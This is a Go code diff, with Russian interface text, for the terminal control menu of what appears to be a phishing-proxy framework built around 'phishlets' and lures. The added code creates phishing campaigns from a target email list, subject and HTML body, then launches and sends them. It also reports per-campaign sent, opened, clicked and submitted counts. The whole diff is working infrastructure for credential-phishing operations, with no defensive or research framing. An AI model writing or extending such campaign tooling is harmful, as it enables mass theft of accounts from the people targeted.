@@ -43,6 +43,8 @@ const (
 	sPick
 	sPhishDetail
 	sDomainAdd
+	sCampNew
+	sCamps
 	sResult
 )
 
@@ -88,6 +90,8 @@ func initialModel(c *Client) model {
 		item{"Generate", "новый фишлет: origin→domain→id", sGenerate},
 		item{"Phishlet domain", "сменить base_domains", sPhishDomain},
 		item{"Phishlet on/off", "вкл/выкл без рестарта", sPhishToggle},
+		item{"Campaigns", "рассылки и статистика", sCamps},
+		item{"Campaign+", "новая: цели -> launch -> send", sCampNew},
 		item{"Domains", "пресеты доменов", sDomains},
 		item{"Quit", "выход (сервер продолжает работать)", sMenu},
 	}
@@ -221,7 +225,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 func (m model) isForm() bool {
 	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate ||
-		m.screen == sDomainAdd
+		m.screen == sDomainAdd || m.screen == sCampNew
 }
 
 // openPick открывает пикер со списком.
@@ -376,6 +380,19 @@ func (m model) pickEnter() (tea.Model, tea.Cmd) {
 			return m.showResult("domain: " + err.Error(), true), nil
 		}
 		return m.showResult(m.pickPhishlet+" → "+sel.title, false), nil
+	case "camp":
+		id := strings.Fields(sel.title)[0]
+		list, err := m.client.ListCampaigns()
+		if err != nil {
+			return m.showResult("campaigns: " + err.Error(), true), nil
+		}
+		for _, c := range list {
+			if c.ID == id {
+				return m.showResult(fmt.Sprintf("%s\nстатус %s\nвсего %d\nsent %d open %d click %d submit %d",
+					c.Name, c.Status, c.Total, c.Sent, c.Opened, c.Clicked, c.Submitted), false), nil
+			}
+		}
+		return m.showResult("нет кампании", true), nil
 	case "domains":
 		return m.showResult("домен: " + sel.title + "  (a-добавить x-удалить)", false), nil
 	}
@@ -472,6 +489,21 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 				return m.showResult("phishlets: " + err.Error(), true), nil
 			}
 			return m.openPick("phishlet -> on/off", "phish-toggle", items), nil
+		case sCamps:
+			list, err := m.client.ListCampaigns()
+			if err != nil {
+				return m.showResult("campaigns: " + err.Error(), true), nil
+			}
+			items := make([]string, 0, len(list))
+			for _, c := range list {
+				items = append(items, fmt.Sprintf("%s %s [%s] %d", c.ID, c.Name, c.Status, c.Total))
+			}
+			return m.openPick("кампании", "camp", items), nil
+		case sCampNew:
+			m.inputs, m.labels = mkInputs(
+				[]string{"название", "phishlet id", "emails через запятую", "subject", "body html", "url_base", "ttl мин"},
+				[]string{"", "", "", "", "", "", "10080"})
+			m.focus = 0
 		case sDomains:
 			doms, err := m.client.ListDomains()
 			if err != nil {
@@ -507,6 +539,28 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 		}
 		lines := strings.SplitN(yml, "\n", 14)
 		return m.showResult(strings.Join(lines, "\n")+"\n…", false), nil
+	case sCampNew:
+		emails := splitCSV(m.inputs[2].Value())
+		if m.inputs[0].Value() == "" || m.inputs[1].Value() == "" || len(emails) == 0 {
+			return m.showResult("нужны название, фишлет и emails", true), nil
+		}
+		id, err := m.client.CreateCampaign(m.inputs[0].Value(), m.inputs[1].Value(), atoi(m.inputs[6].Value()), 1)
+		if err != nil {
+			return m.showResult("create: " + err.Error(), true), nil
+		}
+		added, err := m.client.AddTargets(id, emails)
+		if err != nil {
+			return m.showResult("targets: " + err.Error(), true), nil
+		}
+		targets, err := m.client.LaunchCampaign(id)
+		if err != nil {
+			return m.showResult("launch: " + err.Error(), true), nil
+		}
+		sent, err := m.client.SendCampaign(id, m.inputs[3].Value(), m.inputs[4].Value(), m.inputs[5].Value())
+		if err != nil {
+			return m.showResult("send: " + err.Error(), true), nil
+		}
+		return m.showResult(fmt.Sprintf("кампания %s: целей %d, приманок %d, отправлено %d", id, added, len(targets), sent), false), nil
 	case sDomainAdd:
 		domain := strings.TrimSpace(m.inputs[0].Value())
 		if domain == "" {
@@ -558,6 +612,16 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 func (m model) showResult(s string, isErr bool) model {
 	m.screen, m.result, m.isErr = sResult, s, isErr
 	return m
+}
+
+func splitCSV(s string) []string {
+	var out []string
+	for _, p := range strings.Split(s, ",") {
+		if p = strings.TrimSpace(p); p != "" {
+			out = append(out, p)
+		}
+	}
+	return out
 }
 
 func atoi(s string) int {
